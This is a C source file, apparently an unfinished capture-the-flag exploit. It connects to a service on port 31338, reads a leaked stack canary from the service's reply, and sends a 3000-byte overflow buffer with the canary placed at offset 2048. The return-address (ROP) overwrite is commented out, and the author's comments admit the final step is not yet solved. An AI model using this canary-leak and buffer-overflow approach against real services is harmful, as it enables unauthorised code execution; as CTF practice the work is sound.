#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#define TARGET_ADDR "localhost" // "128.238.66.212"
#define TARGET_PORT "31338"
#define RECV_BUFFER 107

#define ROP_OFFSET 2064
#define CANARY_OFFSET 2048
#define SEND_BUFFER 3000

#define ROP_TARGET 0x80488b2 //0x8048cf0 //0x8048be0
int main()
{
	struct addrinfo hints, *res, *p;
	char buffer[RECV_BUFFER+1];
	int sfd, rcv, *stack_cookie;
	void* send_buffer;

	int evil = ROP_TARGET;

	send_buffer = malloc(SEND_BUFFER);
	if(send_buffer == NULL) {
		fprintf(stderr, "Failed to allocate space for payload.\n");
		return EXIT_FAILURE;
	}

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	int status = getaddrinfo(TARGET_ADDR, TARGET_PORT, &hints, &res);

	if(status != 0) {
		fprintf(stderr, "DEAD: %s\n", gai_strerror(status));
		return EXIT_FAILURE;
	}

	for(p = res; p != NULL; p = p->ai_next) {
		sfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if(sfd == -1) continue;
		if(connect(sfd, p->ai_addr, p->ai_addrlen) != -1)
			break; /* success */
		close(sfd);
	}

	if (p==NULL) { 
		fprintf(stderr, "DEAD: Failed to connect\n");
		return EXIT_FAILURE;
	}


	rcv = recv(sfd, (void*)buffer, RECV_BUFFER, MSG_WAITALL);
	buffer[rcv] = '\0';

	// Stack cookie sits in the return. How handy.
	stack_cookie = (int*)(buffer+4);
	

	printf("RECIEVED: %s\n", buffer);
	printf("Cookie: 0x%X\n\n", *stack_cookie);

	// Set the payload and seed the cookie.
	memset(send_buffer, 0xFF, SEND_BUFFER);
	memcpy(send_buffer+CANARY_OFFSET, (void*)stack_cookie, 4);
	//memcpy(send_buffer+ROP_OFFSET, (void*)&evil, 4);
	
	/* The question is what to do now. The stack cookie is in place. We can driect application flow.
	 * I have never done ROP before but i think that is the solution here. Or it is a shell script.
	 * I still have not been able to define the allowed size of the buffer.
	 * I cannot find any refrence to the flag in the memory of the application so i assume you must read it
	 * from a file. Shell code, or ROP seems to be the only solution.
	 */

	send(sfd, send_buffer, SEND_BUFFER, 0);

	// Print watever it gives us back. hopefully it has the key in it.
	memset(send_buffer, 0x00, SEND_BUFFER);
	rcv = recv(sfd, send_buffer, SEND_BUFFER, MSG_WAITALL);
	printf("\nRecieved: %i\n%s\n\n", rcv, send_buffer);
	
	close(sfd);
	freeaddrinfo(res);
	free(send_buffer);
	return EXIT_SUCCESS;
}
